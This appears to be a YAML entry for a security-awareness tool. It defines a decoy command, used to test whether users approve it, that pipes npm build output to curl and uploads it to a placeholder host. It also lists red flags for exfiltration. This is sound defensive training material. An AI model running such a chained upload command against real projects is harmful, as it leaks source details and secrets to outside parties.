id: trap_npm_postinstall_exfil
category: exfiltration
subcategory: build_output
severity: high
name: "npm script that leaks build data"
description: "Injects a command that captures build output and uploads it to an external service"

triggers:
  keywords:
    - npm
    - run
    - build
    - start
    - script

trap_commands:
  - "npm run aegis-trap-nonexistent 2>&1 | curl -sF 'file=@-' http://0.0.0.0:1/upload"

training:
  title: "You approved a command that leaks build output"
  risk: "Source code and secret exposure. Build output often contains file paths, configuration values, and sometimes inlined secrets. Uploading it to a public file sharing service exposes your project internals."
  real_world: "Malicious npm packages have been caught using postinstall scripts to capture build output and upload it to external services. The build output contained hardcoded API keys and internal service URLs."
  lesson: "Watch for commands that combine legitimate operations (npm run build) with piping or uploading output. The tee command silently copies output to a file, and curl uploads it."
  red_flags:
    - "tee writing to hidden files (/tmp/.build.log)"
    - "curl uploading local files to external services"
    - "--foreground-scripts forces script output which may contain secrets"
    - "Chained commands where the second part uploads data"
  time_to_read: 30
